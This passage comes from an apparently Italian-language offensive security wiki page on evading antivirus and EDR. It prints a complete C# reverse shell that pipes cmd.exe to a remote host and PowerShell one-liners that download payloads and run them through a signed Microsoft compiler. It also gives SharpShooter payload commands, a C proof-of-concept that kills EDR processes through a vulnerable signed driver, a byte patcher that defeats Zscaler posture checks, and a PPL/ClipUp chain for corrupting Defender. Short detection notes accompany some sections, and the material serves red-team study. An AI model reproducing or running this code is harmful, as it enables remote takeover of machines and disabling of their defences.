// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscator per C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta con sé il **proprio driver vulnerabile ma *firmato*** e lo sfrutta per emettere operazioni privilegiate in kernel che anche i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Signed driver**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` di Antiy Labs’ “System In-Depth Analysis Toolkit”. Poiché il driver possiede una firma Microsoft valida viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dalla user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD salta completamente le protezioni in user-mode; il codice che esegue in kernel può aprire processi *protetti*, terminarli o manomettere oggetti di kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Detection / Mitigation
•  Abilitare la lista di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi *kernel* services e generare alert quando un driver viene caricato da una directory scrivibile da tutti o non presente nella allow-list.  
•  Sorvegliare handle in user-mode verso device object custom seguiti da sospette chiamate `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte di design deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente client-side** (viene inviato un booleano al server).  
2. Gli endpoint RPC interni validano solo che l'eseguibile connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).

Patchando **quattro binari firmati su disco** entrambi i meccanismi possono essere neutralizzati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può legarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Cortocircuitata |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Tutte** le posture checks mostrano **verde/conforme**.
* Binaries non firmati o modificati possono aprire gli endpoint RPC named-pipe (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente client-side e semplici controlli di firma possano essere bypassati con poche patch di byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applica una gerarchia signer/level in modo che solo processi protetti con livello uguale o superiore possano manomettersi a vicenda. In offensiva, se si può legittimamente lanciare un binario abilitato PPL e controllarne gli argomenti, si può convertire funzionalità benigni (es. logging) in una primitive di scrittura vincolata e supportata da PPL contro directory protette usate da AV/EDR.

Cosa fa sì che un processo venga eseguito come PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di avvio
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Schema di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene lanciato come processo PPL, la scrittura del file avviene con supporto PPL.
- ClipUp non riesce a interpretare percorsi contenenti spazi; usare percorsi brevi 8.3 per puntare a posizioni normalmente protette.

8.3 short path helpers
- Elencare i nomi brevi: `dir /x` in ogni directory superiore.
- Derivare il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avviare la LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (e.g., CreateProcessAsPPL).
2) Passare l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (e.g., Defender Platform). Usare nomi brevi 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (e.g., MsMpEng.exe), pianificare la scrittura all'avvio prima che l'AV si avvii installando un servizio auto-start che venga eseguito in modo affidabile prima. Validare l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio la scrittura con supporto PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes e vincoli
- Non puoi controllare il contenuto che ClipUp scrive oltre al posizionamento; la primitiva è adatta più alla corruzione che all'iniezione precisa di contenuti.
- Richiede privilegi locali admin/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l'esecuzione all'avvio evita i file lock.

Rilevamenti
- Creazione di processi `ClipUp.exe` con argomenti insoliti, specialmente se parentati da launcher non standard, durante l'avvio.
- Nuovi servizi configurati per auto-start con binari sospetti e che partono costantemente prima di Defender/AV. Investigare la creazione/modifica dei servizi prima di errori di avvio di Defender.
- Monitoraggio dell'integrità dei file su binari/Directory Platform di Defender; creazioni/modifiche inaspettate di file da processi con flag protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo dei livelli PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono girare come PPL e sotto quali parent; bloccare le invocazioni di ClipUp fuori dai contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi ad auto-start e monitorare manipolazioni dell'ordine di avvio.
- Assicurarsi che Defender tamper protection e le protezioni early-launch siano abilitate; investigare errori di avvio che indicano corruzione di binari.
- Considerare la disabilitazione della generazione di nomi brevi 8.3 sui volumi che ospitano tooling di sicurezza se compatibile con il vostro ambiente (testare approfonditamente).

Riferimenti per PPL e tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
